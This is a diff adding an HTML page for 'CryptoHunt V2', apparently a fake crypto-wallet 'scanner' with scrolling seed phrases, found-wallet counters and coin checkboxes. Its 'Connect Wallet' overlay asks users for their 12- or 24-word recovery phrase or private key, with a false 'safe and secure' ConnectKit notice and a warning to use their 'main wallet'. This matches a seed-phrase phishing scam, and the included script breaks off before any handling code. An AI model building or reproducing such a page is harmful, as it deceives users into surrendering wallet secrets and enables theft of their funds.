@@ -1,0 +1,1602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, viewport-fit=cover">
+    <title>CryptoHunt V2 - Home</title>
+    <style>
+        @font-face {
+            font-family: 'SF Pro Text';
+            src: url('fonts/SF-Pro-Text-Bold.otf') format('opentype');
+            font-weight: bold;
+        }
+
+        @font-face {
+            font-family: 'SF Pro Display';
+            src: url('fonts/SF-Pro-Display-Semibold.otf') format('opentype');
+            font-weight: 600;
+        }
+
+        @font-face {
+    font-family: 'SF Pro Display';
+    src: url('fonts/SF-Pro-Display-Regular.otf') format('opentype');
+    font-weight: normal;
+}
+
+@font-face {
+    font-family: 'SF Pro Display';
+    src: url('fonts/SF-Pro-Display-Medium.otf') format('opentype');
+    font-weight: 500;
+}
+
+@font-face {
+    font-family: 'SF Pro Text';
+    src: url('fonts/SF-Pro-Text-Medium.otf') format('opentype');
+    font-weight: 500;
+}
+
+@font-face {
+    font-family: 'SF Pro Display';
+    src: url('fonts/SF-Pro-Display-Bold.otf') format('opentype');
+    font-weight: bold;
+}
+
+        body {
+            background-color: #060606;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            font-family: 'SF Pro Text', sans-serif;
+        }
+
+       html {
+    -webkit-text-size-adjust: none;
+    text-size-adjust: none;
+        }
+
+       .safe-area {
+            padding-top: env(safe-area-inset-top);
+            padding-bottom: env(safe-area-inset-bottom);
+            padding-left: env(safe-area-inset-left);
+            padding-right: env(safe-area-inset-right);
+        }
+
+        .title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 45px;
+            text-align: center;
+            margin-bottom: 50px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .title-main {
+            color: #FFFFFF;
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: bold;
+            font-size: 23px;
+        }
+
+        .title-version {
+            color: rgba(255, 255, 255, 0.4);
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: bold;
+            font-size: 23px;
+        }
+
+        .connect-wallet {
+            position: absolute;
+            left: 15px;
+            top: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px 15px;
+            background-color: #007AFF; /* Button background */
+            color: #FFFFFF; /* Text color */
+            font-family: 'SF Pro Text', sans-serif;
+            font-size: 17px;
+            font-weight: Semibold;
+            text-decoration: none;
+            white-space: nowrap;
+            border: none;
+            border-radius: 30px; /* Rounded edges */
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .connect-wallet:hover {
+            opacity: 0.5;
+        }
+
+        .wallet-icon {
+            width: 20px;
+            height: 20px;
+            fill: rgba(255, 255, 255, 1);
+        }
+
+        .control-icons {
+            position: absolute;
+            display: flex;
+            align-items: center;
+            gap: 22px;
+            right: 20px;
+            top: 94px;
+        }
+
+        .icon {
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .icon:hover {
+            opacity: 0.5;
+        }
+
+        .history-icon {
+            width: 32px;
+            height: 32px;
+        }
+
+        .contact-icon {
+            width: 30px;
+            height: 30px;
+        }
+
+        .logout-icon {
+            width: 28px;
+            height: 28px;
+        }
+
+        .wallet-count {
+            position: absolute;
+            left: 23px;
+            top: 150px;
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: 600;
+            font-size: 20px;
+            color: #FFFFFF;
+        }
+
+        .scanner-field {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 192px;
+            width: calc(100% - 25px);
+            max-width: 500px;
+            height: 350px;
+            background: rgba(55, 192, 88, 0.1);
+            backdrop-filter: blur(250px);
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        .scanner-divider {
+            position: absolute;
+            left: 0;
+            top: -20px;
+            width: 8px;
+            height: 390px;
+            background: rgba(77, 240, 77, 0.8);
+        }
+
+        .scanner-content {
+            padding: 5px 5px 5px 13px;
+            font-family: 'SF Mono', monospace;
+            font-size: 15px;
+            letter-spacing: 0.02em;
+            color: #00FF00;
+            text-align: center;
+            height: 100%;
+            overflow: hidden;
+            text-align: left;
+}
+
+       .phrase-line {
+            padding: 2px 2px;
+            white-space: nowrap;
+        }
+
+        .found-count {
+            position: absolute;
+            left: 23px;
+            top: 562px;
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: 600;
+            font-size: 20px;
+            color: #FFFFFF;
+        }
+
+        .crypto-grid {
+            position: absolute;
+            top: 606px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            width: calc(100% - 50px);
+            max-width: 500px;
+        }
+
+        .crypto-row {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+        }
+
+        .crypto-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .crypto-logo {
+            width: 35px;
+            height: 35px;
+        }
+
+        .crypto-checkbox {
+            width: 23px;
+            height: 23px;
+            border-radius: 7px;
+            appearance: none;
+            border: 2px solid #37C058;
+            cursor: pointer;
+        }
+
+        .crypto-checkbox:checked {
+            background-color: #37C058;
+        }
+
+        .control-buttons {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 750px;
+            display: flex;
+            gap: 25px;
+            width: calc(100% - 45px);
+            max-width: 345px;
+            justify-content: center;
+        }
+
+        .start-button, .stop-button {
+            width: 160px;
+            height: 60px;
+            border-radius: 20px;
+            border: none;
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: 600;
+            font-size: 18px;
+            color: #FFFFFF;
+            cursor: pointer;
+            flex: 1;
+            max-width: 160px;
+        }
+
+        .start-button {
+            background-color: #007AFF;
+            opacity: 1;
+        }
+
+        .stop-button {
+            background-color: rgb(255, 59, 48);
+            color: rgb(255, 255, 255);
+            opacity: 0.5;  /* Initial inactive state */
+        }
+
+        .stop-button.active {
+            background-color: rgba(255, 59, 48, 1);
+            color: #FFFFFF;
+        }
+
+        .history-overlay {
+            display: none;  /* Hide by default */
+            position: fixed;
+            left: 0;
+            top: 81px;
+            width: 100%;
+            max-width: 500px;
+            height: calc(100vh - 70px);
+            border-radius: 35px 35px 0 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(80px);
+            transform: translateY(100%);
+            transition: transform 0.3s ease-out;
+            z-index: 1000;
+            left: 50%;
+            transform: translateX(-50%) translateY(100%);
+}
+
+.history-overlay.active {
+    display: block;  /* Show when active */
+    transform: translateX(-50%) translateY(0);
+}
+
+.history-overlay::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    border-radius: 35px 35px 0 0;
+    pointer-events: none;
+}
+
+.history-title {
+    position: absolute;
+    left: 28px;
+    top: 10px;
+    font-family: 'SF Pro Text', sans-serif;
+    font-weight: 500;
+    font-size: 22px;
+    letter-spacing: 1px;
+    color: #FFFFFF;
+}
+
+.close-icon {
+    position: absolute;
+    right: 22px;
+    top: 22px;
+    width: 16px;
+    height: 16px;
+    color: #818383;
+    cursor: pointer;
+}
+
+.history-illustration {
+    position: absolute;
+    left: 50%;
+    top: 283.37px;
+    transform: translateX(-50%);
+    width: 117.35px;
+    height: 133.42px;
+    opacity: 0.4;
+}
+
+.empty-wallet-message {
+    position: absolute;
+    left: 50%;
+    top: 464px;
+    transform: translateX(-50%);
+    font-family: 'SF Pro Text', sans-serif;
+    font-weight: 400;
+    font-size: 18px;
+    letter-spacing: 1px;
+    color: #FFFFFF;
+    text-align: center;
+    white-space: nowrap;
+ }
+
+.connect-kit-overlay {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 207px;
+            width: 100%;
+            max-width: 500px;
+            height: calc(100vh - 20px);
+            background-color: #151515;
+            border-radius: 30px 30px 0 0;
+            transform: translateX(-50%) translateY(100%);
+            transition: transform 0.3s ease-out;
+            z-index: 2000;
+        }
+
+        .connect-kit-overlay::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 30px 30px 0 0;
+            pointer-events: none;
+        }
+
+        .connect-kit-overlay.active {
+            display: block;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .question-mark {
+            position: absolute;
+            left: 24px;
+            top: 26px;
+            width: 25px;
+            height: 25px;
+            cursor: pointer;
+            z-index: 1002;
+        }
+
+        .connect-title {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-35%);
+    right: 0;
+    top: 26px;
+    margin: 0 auto;
+    text-align: center;
+    font-family: 'SF Pro Display', sans-serif;
+    font-weight: 600;
+    font-size: 22px;
+    color: #FFFFFF;
+    white-space: nowrap;
+    width: 100%;
+
+        }
+
+        .close-icon {
+            position: absolute;
+            right: 24px;
+            top: 31px;
+            width: 15px;
+            height: 15px;
+            cursor: pointer;
+            z-index: 1001;
+        }
+
+        .info-box {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 80px;
+            width: calc(100% - 40px);
+            max-width: 500px;
+            background-color: rgba(0, 122, 255, 0.15);
+            border-radius: 15px;
+            margin-top: -5px;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+
+        .info-text {
+    font-family: 'SF Pro Display', sans-serif;
+    font-size: 15.5px;
+    color: #FFFFFF;
+    text-align: center;
+    margin: 0;
+    line-height: 1.4;
+        }
+
+        .info-text .api-text {
+            font-weight: 500;
+        }
+
+        .info-text .read-more {
+            font-weight: 500;
+            color: #007AFF;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .wallet-option {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    width: calc(100% - 48px);
+    max-width: 500px;
+    height: 75px;
+    margin-top: -10px;
+    background-color: #252525;
+    border-radius: 20px;
+    cursor: pointer;
+        }
+
+        .wallet-option:hover {
+            opacity: 0.8;
+        }
+
+        .trust-wallet { top: 165px; }
+        .metamask { top: 255px; }
+        .coinbase { top: 345px; }
+        .other-wallets { top: 435px; }
+
+        .wallet-name {
+            position: absolute;
+            left: 25px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-family: 'SF Pro Display', sans-serif;
+            font-weight: 600;
+            font-size: 20px;
+            color: #FFFFFF;
+        }
+
+        .wallet-logo {
+            position: absolute;
+            right: 25px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+       .no-wallet-cta {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    width: fit-content;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 520px;
+    gap: 8px;
+    cursor: pointer;
+    color: #818383;
+    transition: color 0.3s;
+    white-space: nowrap;
+    text-decoration: none !important;
+        }
+
+        .no-wallet-cta:hover {
+            color: #FFFFFF;
+        }
+
+        .no-wallet-cta img {
+            width: 27px;
+            height: 19px;
+        }
+
+        .no-wallet-text {
+            font-family: 'SF Pro Display', sans-serif;
+            font-weight: 600;
+            font-size: 18px;
+            text-decoration: none !important;
+            color: inherit;
+        }
+
+        .connect-wallet-overlay {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 207px;
+            width: 100%;
+            max-width: 500px;
+            height: calc(100vh - 20px);
+            background-color: #151515;
+            border-radius: 30px 30px 0 0;
+            transform: translateX(-50%) translateY(100%);
+            transition: transform 0.3s ease-out;
+            z-index: 2000;
+        }
+
+        .connect-wallet-overlay::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 30px 30px 0 0;
+            pointer-events: none;
+        }
+
+        .connect-wallet-overlay.active {
+            display: block;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .return-icon {
+            position: absolute;
+            left: 24px;
+            top: 28px;
+            width: 11px;
+            height: 21px;
+            cursor: pointer;
+            color: #818383;
+            z-index: 1002;
+        }
+
+        .connect-title {
+            position: absolute;
+            left: 127px;
+            top: 26px;
+            font-family: 'SF Pro Display', sans-serif;
+            font-weight: 600;
+            font-size: 22px;
+            color: #FFFFFF;
+        }
+
+        .close-icon {
+            position: absolute;
+            right: 22px;
+            top: 31px;
+            width: 15px;
+            height: 15px;
+            cursor: pointer;
+        }
+
+        .warning-box {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    top: 76px;
+    width: calc(100% - 48px);
+    background-color: rgba(253, 198, 51, 0.1);
+    border-radius: 15px;
+    padding: 5px;
+    box-sizing: border-box;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+        }
+
+        .warning-text {
+    font-family: 'SF Pro Display', sans-serif;
+    font-size: 16px;
+    color: #FDC633;
+    text-align: left;
+    margin: 0;
+    padding: 0 5px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+        }
+
+        .warning-icon {
+            font-family: 'SF Pro Display', sans-serif;
+            font-weight: bold;
+        }
+
+        .option-buttons {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    top: 160px;
+    display: flex;
+    gap: 12px;
+    width: calc(100% - 35px);
+    justify-content: center;
+        }
+
+        .option-btn {
+            width: 165px;
+            height: 45px;
+            border-radius: 300px;
+            border: none;
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: 500;
+            font-size: 16px;
+            letter-spacing: -0.24px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .recovery-btn {
+            background-color: rgba(0, 122, 255, 0.1);
+            color: #007AFF;
+        }
+
+        .private-key-btn {
+            background-color: #252525;
+            color: #818383;
+        }
+
+        .active-option {
+            background-color: rgba(0, 122, 255, 0.1);
+            color: #007AFF;
+        }
+
+        .inactive-option {
+            background-color: #252525;
+            color: #818383;
+        }
+
+        .input-field {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 231px;
+            width: calc(100% - 48px);
+            height: 155px;
+            background-color: rgba(37, 37, 37, 0.60);
+            border-radius: 20px;
+            padding: 14px 16px;
+            box-sizing: border-box;
+            border: none;
+            resize: none;
+            color: #FFFFFF;
+            font-family: 'SF Pro Text', sans-serif;
+            letter-spacing: 0.3px;
+            font-weight: 400;
+            font-size: 15px;
+        }
+
+        .input-field::placeholder {
+            color: rgba(235, 235, 245, 0.5);
+        }
+
+        .connect-button {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 430px;
+            width: calc(100% - 48px);
+            height: 60px;
+            background-color: #007AFF;
+            border-radius: 20px;
+            border: none;
+            font-family: 'SF Pro Text', sans-serif;
+            font-weight: bold;
+            font-size: 18px;
+            color: #FFFFFF;
+            cursor: pointer;
+        }
+
+       .message {
+            position: absolute;
+            left: 50%;
+            top: 510px;
+            transform: translateX(-50%);
+            font-family: 'SF Pro Display', sans-serif;
+            font-weight: 500;
+            font-size: 18px;
+            text-align: center;
+            display: none;
+            white-space: nowrap;
+        }
+
+        .success-message {
+            color: #4DF04D;
+        }
+
+        .error-message {
+            color: #FF3B30;
+        }
+
+.alert-container {
+    position: fixed;
+    left: 14px;
+    right: 14px;
+    top: 550px;
+    margin: 0 auto;
+    border-radius: 35px;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(100px);
+    -webkit-backdrop-filter: blur(100px);
+    padding: 16px 16px;
+    overflow: hidden; /* Prevent content overflow */
+    opacity: 0;
+    transform: translateY(20px);
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    font-family: "SF Pro Text", sans-serif;
+    z-index: 1000;
+}
+
+.alert-container.show {
+    opacity: 1;
+    transform: translateY(0);
+}
+
+/* Keep your existing styles and add these enhancements */
+.alert-button-cancel, .alert-button-connect {
+    transition: transform 0.2s ease, opacity 0.2s ease;
+}
+
+.alert-button-cancel:hover, .alert-button-connect:hover {
+    transform: scale(0.98);
+    opacity: 0.9;
+}
+
+.alert-button-cancel:active, .alert-button-connect:active {
+    transform: scale(0.95);
+}
+
+.alert-text-highlight {
+    color: #007AFF;
+    font-weight: 500;
+}
+
+.alert-text-separator {
+    color: #818383;
+    margin: 0 2px;
+}
+
+.alert-header {
+    color: #FFFFFF;
+    font-size: 17px;
+    letter-spacing: -0.24px;
+}
+
+.alert-message {
+    color: #818383;
+    font-size: 15px;
+    letter-spacing: -0.24px;
+    margin-top: 10px;
+}
+
+.alert-actions {
+    display: flex;
+    gap: 12px;
+    margin-top: 18px;
+}
+
+.alert-button-cancel, .alert-button-connect {
+    flex: 1;
+    height: 43px;
+    border-radius: 300px;
+    border: none;
+    font-size: 18px;
+    letter-spacing: -0.24px;
+    font-family: "SF Pro Text", sans-serif;
+    font-weight: 500;
+    cursor: pointer;
+}
+
+.alert-button-cancel {
+    background: #2C2C2D;
+    color: #FFFFFF;
+}
+
+.alert-button-connect {
+    background: #1A1C2D;
+    color: #007AFF;
+}
+
+.double-space {
+    display: inline-block;
+    width: 0.75em;
+}
+
+.awaiting-text {
+    opacity: 0.4;
+    color: #FFFFFF;
+    margin-left: 0.25em;
+}
+
+@media (min-width: 350px) and (max-width: 367px) {
+    .alert-header {
+        font-size: 17px;
+    }
+}
+
+@media (min-width: 400px) and (max-width: 450px) {
+    .alert-container {
+        height: 150px; /* Added 20px */
+        border-radius: 38px;
+    }
+    
+    .alert-header {
+        font-size: 19px;
+    }
+    
+    .alert-message {
+        font-size: 17px;
+        margin-top: 12px;
+    }
+
+    .alert-actions {
+        margin-top: 23px;
+    }
+    
+    .alert-button-cancel, .alert-button-connect {
+        font-size: 18px;
+        height: 45px;
+    }
+}
+       
+@media (min-width: 300px) and (max-width: 354px) {
+    .warning-text {
+        font-size: 14px;
+    }
+}
+
+@media (min-width: 355px) and (max-width: 369px) {
+    .warning-text {
+        font-size: 14.5px;
+    }
+}
+
+@media (min-width: 370px) and (max-width: 400px) {
+    .warning-text {
+        font-size: 16.5px;
+    }
+
+    .option-buttons {
+       top: 170px;
+       gap: 17px;
+    }
+
+    .input-field {
+       top: 240px;
+       height: 175px;
+    }
+
+    .connect-button {
+       top: 450px;
+    }
+
+    .message {
+       top: 530px;
+    }
+}
+
+@media (min-width: 401px) and (max-width: 450px) {
+    .warning-text {
+        font-size: 18px;
+    }
+
+    .option-buttons {
+       top: 180px;
+       gap: 17px;
+    }
+
+    .input-field {
+       top: 250px;
+       height: 185px;
+    }
+
+    .connect-button {
+       top: 480px;
+    }
+
+    .message {
+       top: 560px;
+    }
+}
+
+@media (min-width: 300px) and (max-width: 354px) {
+    .info-text {
+        font-size: 13px;
+    }
+    
+    .wallet-name {
+        font-size: 18px;
+    }
+}
+
+@media (min-width: 355px) and (max-width: 369px) {
+    .info-text {
+        font-size: 14px;
+    }
+    
+    .wallet-name {
+        font-size: 18px;
+    }
+}
+
+@media (min-width: 370px) and (max-width: 401px) {
+    .info-text {
+        font-size: 14.5px;
+    }
+    
+    .wallet-name {
+        font-size: 18px;
+    }
+}
+
+@media (min-width: 400px) and (max-width: 450px) {
+     .connect-title {
+      transform: translateX(-30%);
+    }
+
+    .info-text {
+        font-size: 15px;
+    }
+}
+
+@media (min-width: 340px) and (max-width: 359px) {
+    .connect-wallet, .control-icons, {
+        top: 82px;
+    }
+    .wallet-count {
+        top: 145px;
+    }
+    .scanner-field {
+        height: 290px;
+        top: 180px;
+    }
+    .history-icon {
+        width: 30px;
+        height: 30px;
+    }
+    .contact-icon {
+        width: 28px;
+        height: 28px;
+    }
+    .logout-icon {
+        width: 26px;
+        height: 26px;
+    }
+    .control-icons {
+        right: 10px;
+        gap: 15px;
+    }
+    .wallet-count, .found-count {
+        font-size: 17px;
+        font-weight: 400;
+    }
+    .found-count {
+        top: 485px;
+    }
+    .crypto-grid {
+        top: 520px;
+    }
+    .control-buttons {
+        top: 650px;
+    }
+}
+
+@media (min-width: 360px) and (max-width: 370px) {
+    .connect-wallet, .control-icons, {
+        top: 85px;
+    }
+    .wallet-count {
+        top: 145px;
+    }
+    .scanner-field {
+        height: 310px;
+        top: 180px;
+    }
+    .control-icons {
+        right: 10px;
+        gap: 15px;
+    }
+    .wallet-count, .found-count {
+        font-size: 18px;
+        font-weight: 600;
+    }
+    .found-count {
+        top: 505px;
+    }
+    .crypto-grid {
+        top: 545px;
+    }
+    .control-buttons {
+        top: 680px;
+    }
+}
+
+    @media (min-width: 371px) and (max-width: 395px) {
+    .connect-wallet, .control-icons, {
+        top: 70px;
+    }
+    .wallet-count {
+        top: 150px;
+    }
+    .scanner-field {
+        height: 340px;
+        top: 185px;
+    }
+    .control-icons {
+        right: 10px;
+        gap: 20px;
+    }
+    .wallet-count, .found-count {
+        font-size: 19.5px;
+        font-weight: 600;
+    }
+    .found-count {
+        top: 540px;
+    }
+    .crypto-grid {
+        top: 580px;
+    }
+    .control-buttons {
+        top: 720px;
+    }
+}
+
+@media (min-width: 396px) and (max-width: 435px) {
+    .crypto-logo {
+        width: 40px;
+        height: 40px;
+    }
+    .crypto-checkbox {
+        width: 25px;
+        height: 25px;
+        border-radius: 9px;
+    }
+    .start-button, .stop-button {
+        width: 170px;
+        height: 70px;
+        border-radius: 25px;
+        font-size: 20px;
+    }
+}
+    </style>
+</head>
+   <body>
+    <div class="title">
+        <span class="title-main">CRYPTOHUNT</span>
+        <span class="title-version">V.2</span>
+    </div>
+
+<div class="history-overlay">
+    <h2 class="history-title">History</h2>
+    <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F1f46b830d789f3d3f7bdced735386c2b5203dce382f473d70e1156578b5e0152" 
+         class="history-illustration" 
+         alt="History illustration">
+    <p class="empty-wallet-message">No wallets found yet</p>
+    <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fc4b2b970155f2a08f038b5543eae285180f754dbe09bdd88745b0d103a4175f4" 
+         class="close-icon" 
+         alt="Close">
+</div>
+
+      <div class="connect-kit-overlay">
+        <a href="https://ethereum.org/en/wallets/" target="_blank">
+            <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F7852b77f93ff158a0dbae1b84741752e2bb8bc501e46974727cb910d8042c703" 
+                 alt="Question Mark" 
+                 class="question-mark">
+        </a>
+        
+        <h2 class="connect-title">Connect Wallet</h2>
+        
+        <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F660b4b9295622020cc062a436b6f1dea21c8120198400fe8c9540bbf14c3b9fd" 
+             alt="Close" 
+             class="close-icon">
+
+        <div class="info-box">
+            <p class="info-text">
+                This app uses <span class="api-text">ConnectKit API</span> to connect wallets<br>
+                safely and secure without any hassle. <a href="https://docs.family.co/connectkit/api-reference" target="_blank" class="read-more">Read more</a>
+            </p>
+        </div>
+
+        <div class="wallet-option trust-wallet">
+            <span class="wallet-name">Trust Wallet</span>
+            <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fcca5fbd1f572b13802057430367437be10d16e0053ea31805272ab59b0c5242b" 
+                 alt="Trust Wallet" 
+                 class="wallet-logo"
+                 width="34" 
+                 height="39">
+        </div>
+
+        <div class="wallet-option metamask">
+            <span class="wallet-name">MetaMask</span>
+            <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fba5c8985a5ecef53e863f27e553213122a11d9b85d2a0db249c7ad62148c534f" 
+                 alt="MetaMask" 
+                 class="wallet-logo"
+                 width="36" 
+                 height="33">
+        </div>
+
+        <div class="wallet-option coinbase">
+            <span class="wallet-name">Coinbase Wallet</span>
+            <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F8c992474b49fad706d7b1eea2e0e746b02717f97d6fda32dcc1d9067b5152c1e" 
+                 alt="Coinbase" 
+                 class="wallet-logo"
+                 width="38" 
+                 height="38">
+        </div>
+
+        <div class="wallet-option other-wallets">
+            <span class="wallet-name">Other Wallets</span>
+            <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F6b5d770522e0589c8811e307f8ef75c872059b8f08d8eb6748e01bfaed943409" 
+                 alt="Other Wallets" 
+                 class="wallet-logo"
+                 width="40" 
+                 height="40">
+        </div>
+
+        <a href="https://ethereum.org/en/wallets/find-wallet/" 
+           target="_blank" 
+           class="no-wallet-cta">
+            <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F3e74c52ddbe4c845888c8d5892db51c010b6ba9bca3f57bdc588bfb484739c56" 
+                 alt="Wallet">
+            <span class="no-wallet-text">I don't have a wallet</span>
+        </a>
+    </div>
+
+
+         <div class="connect-wallet-overlay">
+        <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fc700f035ac6237d39e03be87dc20ac7838d620420c020456fd7870f2f716751c" 
+             alt="Return" 
+             class="return-icon">
+        
+        <h2 class="connect-title">Connect Wallet</h2>
+        
+        <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fc4b2b970155f2a08f038b5543eae285180f754dbe09bdd88745b0d103a4175f4" 
+             alt="Close" 
+             class="close-icon">
+
+        <div class="warning-box">
+            <p class="warning-text">
+                <span class="warning-icon">⚠</span> Ensure you are using your main wallet, using a
+                random or different one will result in lost of funds.
+            </p>
+        </div>
+
+        <div class="option-buttons">
+            <button class="option-btn recovery-btn active-option">Recovery Phrase</button>
+            <button class="option-btn private-key-btn">Private Key</button>
+        </div>
+
+        <textarea class="input-field" 
+                  placeholder="Enter 12 or 24 word recovery phrase"></textarea>
+
+        <button class="connect-button">CONNECT WALLET</button>
+
+        <div class="message success-message">Successfully connected a wallet!</div>
+        <div class="message error-message">Invalid recovery phrase. Try again!</div>
+    </div>
+
+    <button class="connect-wallet">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="wallet-icon">
+            <path d="M18.0049 6.99979H21.0049C21.5572 6.99979 22.0049 7.4475 22.0049 7.99979V19.9998C22.0049 20.5521 21.5572 20.9998 21.0049 20.9998H3.00488C2.4526 20.9998 2.00488 20.5521 2.00488 19.9998V3.99979C2.00488 3.4475 2.4526 2.99979 3.00488 2.99979H18.0049V6.99979ZM4.00488 8.99979V18.9998H20.0049V8.99979H4.00488ZM4.00488 4.99979V6.99979H16.0049V4.99979H4.00488ZM15.0049 12.9998H18.0049V14.9998H15.0049V12.9998Z"></path>
+        </svg>
+        Connect Wallet
+    </button>
+
+    <div class="control-icons">
+        <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fd93659d55a12afb407f580dc38460e273cb75a8184ee63cc4391b8ce6defdbab" alt="History" class="icon history-icon">
+        <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F055ac4740e1ba5b77762cb3273a7ffbd6cda9df7162bad1b291ab67ce255eeb7" alt="Contact" class="icon contact-icon">
+        <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F18599d45d0051ae6beac539e368c963df465e2a4ab6243c76110ae4845adb95d" alt="Logout" class="icon logout-icon">
+    </div>
+
+    <div class="wallet-count">Wallet scanned: <span id="scanned-count">0</span></div>
+
+    <div class="scanner-field">
+        <div class="scanner-divider"></div>
+        <div class="scanner-content"></div>
+    </div>
+
+    <div class="found-count">Found: <span id="found-count">0</span></div>
+
+    <div class="crypto-grid">
+        <div class="crypto-row">
+            <div class="crypto-item">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fcfa543a962cd63f1e76722c6b3cb3f4f0df794390769cd23b89c50e4c40a8cb5" alt="BTC" class="crypto-logo">
+                <input type="checkbox" class="crypto-checkbox">
+            </div>
+            <div class="crypto-item">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F52367e6547e11b6740c6969a6cc43965377b6aa66bf2cc4e4c8229f9522ee694" alt="ETH" class="crypto-logo">
+                <input type="checkbox" class="crypto-checkbox">
+            </div>
+            <div class="crypto-item">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F1e5c29fd8eb59966b750c41bec35be67b58583ab70eebd04b5525bb6d8e1d170" alt="USDT" class="crypto-logo">
+                <input type="checkbox" class="crypto-checkbox">
+            </div>
+        </div>
+        <div class="crypto-row">
+            <div class="crypto-item">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F0e04f7eb719d27a00986d129f64b8af3ad1465f84634b6ec2c55a0fedb979cda" alt="LTC" class="crypto-logo">
+                <input type="checkbox" class="crypto-checkbox">
+            </div>
+            <div class="crypto-item">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2Fa6cb4508f7869ecac68d30d7e594dbf6a130b5e4a47bee561b4cc523c659bfea" alt="BNB" class="crypto-logo">
+                <input type="checkbox" class="crypto-checkbox">
+            </div>
+            <div class="crypto-item">
+                <img src="https://cdn.builder.io/api/v1/image/assets%2Fa4bfc9b0fa54402c99ab1925128f6944%2F4399224e3471044db83e841f7f31e1da02fac3665d645dd42f15b4eff13fa576" alt="TRX" class="crypto-logo">
+                <input type="checkbox" class="crypto-checkbox">
+            </div>
+        </div>
+    </div>
+
+    <div class="control-buttons">
+        <button class="start-button">START</button>
+        <button class="stop-button">STOP</button>
+    </div>
+
+    <script src="bip39-wordlist.js"></script>
+
+<script>
+    let walletConnected = false;
+    let scanStartTime = null;
+    let foundDisplayTimeout = null;
+
+    function restoreFoundCount() {
+    if (localStorage.getItem('alertShown') && !walletConnected && !localStorage.getItem('walletConnected')) {
+        const foundCountElement = document.getElementById('found-count');
